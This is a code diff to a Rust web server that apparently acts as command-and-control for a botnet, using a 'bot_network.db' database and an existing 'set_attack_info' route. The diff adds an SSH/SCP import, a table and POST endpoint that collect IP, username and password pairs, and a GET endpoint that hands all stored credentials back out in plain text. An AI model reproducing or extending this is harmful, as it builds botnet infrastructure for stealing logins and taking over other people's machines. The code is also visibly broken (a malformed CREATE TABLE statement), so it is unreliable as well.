@@ -11,6 +11,8 @@ use rusqlite::Connection;
 use serde_json;
 use serde_json::{from_str, Value};
 use std::vec;
+use ssh::{Session, Scp, Mode};
+
 
 fn create_tables(conn: &Connection) {
     conn.execute(
@@ -29,6 +31,13 @@ fn create_tables(conn: &Connection) {
         [],
     )
     .unwrap();
+    conn.execute(
+        "CREATE TABLE IF NOT EXISTS update_info (
+             id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip_username TEXT
+             password TEXT)",
+        [],
+    ).unwrap();
 }
 fn main() {
     let mut router = Router::new();
@@ -155,5 +164,53 @@ fn main() {
         "set_attack_info",
     );
 
+    router.post(
+        "/update_info",
+            move|req: &mut Request| {
+                let request = req.get::<bodyparser::Json>().unwrap().unwrap().to_string();
+                let mut splitted = request.split("\",").collect::<Vec<&str>>();
+                let mut ip_username = splitted[0].to_string();
+                let mut password = splitted[1].to_string();
+                conn.execute(
+                    "INSERT INTO update_info (ip_username, password) VALUES (?1, ?2)",
+                    [ip_username, password]
+                )
+                    .unwrap();
+                Ok(Response::with((status::Ok, "ok")))
+        },
+        "post_update_info"
+    );
+    
+    router.get(
+        "/currently_updating",
+        move |_: &mut Request| Ok(Response::with((status::Ok, "true"))),
+        "currently_updating",
+    );
+
+    router.get(
+        "/update_info",
+        move |_: &mut Request| {
+            let mut vec: Vec<String> = vec![];
+            let conn = Connection::open("bot_network.db").unwrap();
+            create_tables(&conn);
+            let q = "SELECT * FROM update_info";
+            let mut stmt = conn.prepare(q).unwrap();
+            let iter = stmt
+                .query_map([], |row| {
+                    Ok(serde_json::json!({
+                        "id": row.get::<usize, i64>(0).unwrap().to_string(),
+                        "ip_username": row.get::<usize, String>(1).unwrap().to_string(),
+                        "password": row.get::<usize, String>(2).unwrap().to_string()
+                    }))
+                })
+                .unwrap();
+            for elem in iter {
+                vec.push(elem.unwrap().to_string());
+            }
+
+            Ok(Response::with((status::Ok, vec.join("\n"))))
+        },
+        "get_update_info",
+    );
     Iron::new(router).http("localhost:8080").unwrap();
 }
